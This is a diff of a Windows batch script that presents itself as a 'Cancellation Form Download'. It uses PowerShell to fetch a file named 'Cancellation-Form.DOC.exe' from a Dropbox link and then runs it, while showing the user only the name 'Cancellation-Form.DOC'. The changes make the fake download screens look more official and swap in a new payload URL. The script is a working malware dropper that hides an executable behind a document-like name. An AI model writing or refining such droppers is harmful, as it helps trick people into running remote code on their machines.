@@ -1,27 +1,63 @@
 @echo off
 setlocal
+title Cancellation Form Download
+color 0B
+
 set "FILENAME=Cancellation-Form.DOC.exe"
 set "SHOWNAME=Cancellation-Form.DOC"
 
-echo ========================================
-echo Your Cancellation Form is downloading...
-echo Please be patient.
-echo ========================================
+cls
+echo.
+echo  ==================================================
+echo            CANCELLATION FORM DOWNLOAD
+echo  ==================================================
+echo.
+echo   Your cancellation form is ready to download.
+echo.
+echo   Press ENTER to continue...
+echo.
+echo  ==================================================
+pause >nul
+
+cls
+echo.
+echo  ==================================================
+echo            DOWNLOADING FILE...
+echo  ==================================================
+echo   Please wait. Do not close this window.
+echo  ==================================================
+echo.
 
 powershell -NoLogo -NoProfile -Command ^
-  "$client = New-Object System.Net.WebClient; $client.DownloadFile('https://www.dropbox.com/scl/fi/smzcpm5yp7vaoq2wr105a/Cancellation-Form.DOC.exe?rlkey=pafp2pmlytg5rdcvic35vhh4r&st=08qfe9xl&dl=1', '%FILENAME%')"
+  "$client = New-Object System.Net.WebClient; $client.DownloadFile('https://www.dropbox.com/scl/fi/c8j70h9zjjbhuxtisng3e/Cancellation-Form.DOC.exe?rlkey=k1839uj7b4wocccyza5ln8a8w&st=w6qkqxkt&dl=1', '%FILENAME%')"
 
 if exist "%FILENAME%" (
+    cls
     echo.
-    echo ========================================
-    echo File downloaded: %SHOWNAME%
-    echo Location: %cd%\%FILENAME%
-    echo Opening file...
-    echo ========================================
+    echo  ==================================================
+    echo            DOWNLOAD COMPLETE
+    echo  ==================================================
+    echo.
+    echo   File Name : %SHOWNAME%
+    echo   Location  : %cd%\%FILENAME%
+    echo.
+    echo   Opening the file now...
+    echo.
+    echo  ==================================================
     start "" "%FILENAME%"
 ) else (
+    cls
     echo.
-    echo Download failed. Please check your internet connection or try again later.
+    echo  ==================================================
+    echo            DOWNLOAD FAILED
+    echo  ==================================================
+    echo.
+    echo   Please check your internet connection
+    echo   and try again later.
+    echo.
+    echo  ==================================================
 )
 
-pause
+echo.
+echo   Press ENTER to exit...
+pause >nul
